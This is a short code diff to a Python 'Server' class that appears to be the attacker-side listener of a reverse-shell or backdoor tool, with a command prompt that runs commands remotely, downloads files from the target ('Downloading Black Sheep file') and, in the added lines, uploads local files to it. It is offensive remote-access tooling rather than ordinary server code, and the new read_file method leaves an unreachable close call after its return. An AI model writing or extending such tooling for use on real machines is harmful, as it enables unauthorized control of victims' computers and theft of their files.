@@ -36,13 +36,22 @@ class Server:
 			file.write(content)
 			file.close()
 			return "[+]Downloading Black Sheep file"
-			
+
+	def read_file(self, path):
+		with open(path, "rb") as f:
+			return f.read()
+			f.close()
 
 	def run(self):
 		while True:
 			command = input(">>>")
 			command = command.split(" ")
+			if command[0] == "upload":
+				file_content = self.read_file(command[1])
+				command.append(file_content)
+
 			result = self.execute_remotely(command)#.encode())
+
 			if command[0] == "download":
 				result = self.write_file(command[1], result)
 			try:
